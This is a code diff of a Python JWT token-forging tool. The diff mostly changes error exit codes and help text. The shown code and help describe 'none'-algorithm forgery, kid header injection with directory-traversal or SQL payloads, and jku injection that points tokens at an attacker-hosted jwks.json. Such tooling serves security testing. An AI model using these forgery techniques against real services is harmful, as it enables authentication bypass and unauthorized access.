@@ -48,7 +48,7 @@ class Cracker:
         token                     [Your JWT.]
         
         Optional:
-        -a --alg <alg>            [The algorithm; None, none, HS256, RS256.]
+        -a --alg <alg>            [The algorithm; None, none, HS256.]
         -k --key <path>           [The path to the key if it's needed.]
         -p --payload <name:value> [The field you want to change in the payload.]
         -d --decode               [Decode the token and quit.]
@@ -58,12 +58,12 @@ class Cracker:
                                    its token, it will work.]
            --specify-key <string> [A string used as key.]
            --inject-kid <exploit> [Try to inject a payload in the kid header; dirtrv, sqli.]
-           --jku-basic <yourIP>   [Basic jku injection. jku attacks are complicated, you need
-                                   some config. You have to host the jwks.json crafted file on
-                                   your pc or on a domain you have. Pass it to this parameter,
-                                   but don't force a path; jwks are a common path, pass only
-                                   the first part of the url, '/.well-known/jwks.json' will be
-                                   automatically appended.]
+           --jku-basic <yourIP>   [Basic jku injection. Launching this attack the script
+                                   will craft a jwks.json file based on the jku header, and
+                                   generates the relative token. You have to pass the ip or
+                                   the domain of a vps (or any hosting you own) and before
+                                   submitting the token, copy the jwks file in;
+                                   '<yourIP>/.well-known/jwks.json']
         
         Examples:
         python3 jwt.py <token> --decode
@@ -146,13 +146,13 @@ class Cracker:
         token_is_valid = Cracker.check_token(self.token)
         if not token_is_valid:
             print("ERROR: Invalid token!")
-            sys.exit(0)
+            sys.exit(2)
         """Validate alg"""
         if self.alg is not None:
             valid_algs = ["None", "none", "HS256", "hs256"]
             if self.alg not in valid_algs:
                 print(f"{Bcolors.FAIL}ERROR: Invalid algorithm.{Bcolors.ENDC}")
-                sys.exit(0)
+                sys.exit(2)
             else:
                 if self.alg == "hs256":
                     self.alg = "HS256"
@@ -169,7 +169,7 @@ class Cracker:
             """With jku, you can't use other key related args"""
             if any(arg is not None for arg in other_key_related_args) or self.unverified:
                 print(f"{Bcolors.FAIL}ERROR: please don't pass any key related args with jku attacks.{Bcolors.ENDC}")
-                sys.exit(0)
+                sys.exit(2)
             """Generate a key with OpenSSL"""
             key = OpenSSL.crypto.PKey()
             key.generate_key(type=OpenSSL.crypto.TYPE_RSA, bits=2048)
@@ -184,13 +184,13 @@ class Cracker:
         if self.auto_try is not None:
             if self.kid is not None or self.specified_key is not None:
                 print(f"{Bcolors.FAIL}ERROR: --inject-kid uses preset keys, this creates a conflict with --auto-try.{Bcolors.ENDC}")
-                sys.exit(0)
+                sys.exit(2)
             path = Cracker.get_key_from_ssl_cert(self.auto_try)
             self.path_to_key = path
         if self.kid is not None:
             if self.path_to_key is not None or self.specified_key is not None:
                 print(f"{Bcolors.FAIL}ERROR: You don't need to specify a key for kid injections{Bcolors.ENDC}")
-                sys.exit(0)
+                sys.exit(2)
             else:
                 if self.kid.lower() == "dirtrv":
                     self.kid = "DirTrv"
@@ -203,14 +203,14 @@ class Cracker:
                         f"{Bcolors.FAIL}ERROR: Invalid --inject-kid. Please select a valid one{Bcolors.ENDC}",
                         Cracker.usage
                     )
-                    sys.exit(0)
+                    sys.exit(2)
         if self.path_to_key is not None:
             if not os.path.exists(self.path_to_key):
                 print(f"{Bcolors.FAIL}ERROR: Seems like the file does not exist{Bcolors.ENDC}")
-                sys.exit(0)
+                sys.exit(2)
             elif self.alg == "None" or self.alg == "none":
                 print(f"{Bcolors.FAIL}ERROR: You don't need a key with the None algo{Bcolors.ENDC}")
-                sys.exit(0)
+                sys.exit(2)
             elif self.specified_key is not None:
                 self.key = self.specified_key
             else:
@@ -260,7 +260,7 @@ class Cracker:
         elif self.jku_basic:
             if header_dict['jku'] is None:
                 print(f"{Bcolors.FAIL}ERROR: JWT header has not jku.{Bcolors.ENDC}")
-                sys.exit(0)
+                sys.exit(2)
             your_url = self.jku_basic + "/.well-known/jwks.json"
             self.jku_basic_attack(header_dict)
             header_dict['jku'] = your_url
@@ -317,7 +317,7 @@ class Cracker:
             elif self.alg == "HS256":
                 if self.key is None:
                     print(f"{Bcolors.FAIL}ERROR: Key is needed with HS256{Bcolors.ENDC}")
-                    sys.exit(0)
+                    sys.exit(2)
                 signature = base64.urlsafe_b64encode(
                     hmac.new(bytes(self.key, "utf-8"), partial_token.encode('utf-8'), hashlib.sha256).digest()
                 ).decode('utf-8').rstrip("=")
@@ -432,7 +432,7 @@ class Cracker:
             payload_ = base64.urlsafe_b64decode(payload_b64).decode('utf-8')
         except UnicodeDecodeError:
             print(f"{Bcolors.FAIL}ERROR: Decoding Error. Please be sure, to print a valid jwt.{Bcolors.ENDC}")
-            sys.exit(0)
+            sys.exit(2)
         return header_, payload_
 
     @staticmethod
@@ -452,7 +452,7 @@ class Cracker:
             user_payload_value = user_payload[1]
         except IndexError:
             print(f"{Bcolors.FAIL}ERROR: Payload must have this syntax: name:value. You have write '{user_input}'{Bcolors.ENDC}")
-            sys.exit(0)
+            sys.exit(2)
         if user_payload_name not in iterable.keys():
             print(f"{Bcolors.WARNING}WARNING: can't find {user_payload_name} in the token payload. It will be added{Bcolors.ENDC}")
         iterable[user_payload_name] = user_payload_value
@@ -511,7 +511,7 @@ class Cracker:
             print(
                 f"{Bcolors.FAIL}ERROR: Can't openssl s_client can't connect with {hostname}. Please make sure to type correctly{Bcolors.ENDC}"
             )
-            sys.exit(0)
+            sys.exit(2)
         cert = re.findall(pattern, first_command_output)[0][0].rstrip("\n")
         # WRITE CERT.PEM
         with open("cert.pem", 'w') as file:
@@ -523,7 +523,7 @@ class Cracker:
         )
         if second_command_output:
             print(f"{Bcolors.FAIL}ERROR: Maybe the cert is not valid.{Bcolors.ENDC}")
-            sys.exit(0)
+            sys.exit(2)
         key = f"{os.getcwd()}/key.pem"
         devnull_.close()
         return key
@@ -533,7 +533,7 @@ class Cracker:
             self.decode_and_quit()
         if self.alg is None:
             print(f"{Bcolors.FAIL}ERROR: Missing --alg. You can mess it up only if you are decoding a jwt{Bcolors.ENDC}")
-            sys.exit(0)
+            sys.exit(2)
         header, payload = self.modify_header_and_payload()
         new_partial_token = Cracker.craft_token(header, payload)
         signature = self.select_signature(new_partial_token)
